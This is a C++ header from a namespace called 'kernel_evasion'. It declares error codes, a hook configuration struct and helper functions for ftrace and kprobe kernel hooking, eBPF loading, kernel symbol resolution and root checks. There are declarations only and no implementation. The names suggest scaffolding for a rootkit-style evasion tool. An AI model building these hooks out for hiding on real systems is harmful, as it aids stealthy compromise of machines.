#pragma once

#include <cstdint>
#include <string>
#include <vector>
#include <memory>

namespace kernel_evasion {

// Error codes
enum class ErrorCode {
    SUCCESS = 0,
    MODULE_LOAD_FAILED = 1,
    SYMBOL_RESOLUTION_FAILED = 2,
    FTRACE_HOOK_FAILED = 3,
    EBPF_LOAD_FAILED = 4,
    INSUFFICIENT_PRIVILEGES = 5,
    KERNEL_VERSION_UNSUPPORTED = 6,
    HOOK_ALREADY_EXISTS = 7,
    HOOK_NOT_FOUND = 8,
};

// Kernel version info
struct KernelInfo {
    int major;
    int minor;
    int patch;
    std::string release;

    bool operator>=(const KernelInfo& other) const;
};

// Result wrapper
template<typename T>
class Result {
public:
    Result(T value) : value_(value), error_(ErrorCode::SUCCESS) {}
    Result(ErrorCode error) : error_(error) {}

    bool is_success() const { return error_ == ErrorCode::SUCCESS; }
    ErrorCode error() const { return error_; }
    T value() const { return value_; }

private:
    T value_;
    ErrorCode error_;
};

// Hook configuration
struct HookConfig {
    std::string function_name;
    std::string module_name;
    bool use_ftrace = true;
    bool use_kprobe_fallback = true;
};

// Symbol resolution
uint64_t resolve_kernel_symbol(const std::string& symbol);
uint64_t get_kprobe_registered_symbol(const std::string& symbol);

// Utility functions
KernelInfo get_kernel_info();
bool check_kernel_compatibility();
bool is_root();

}  // namespace kernel_evasion
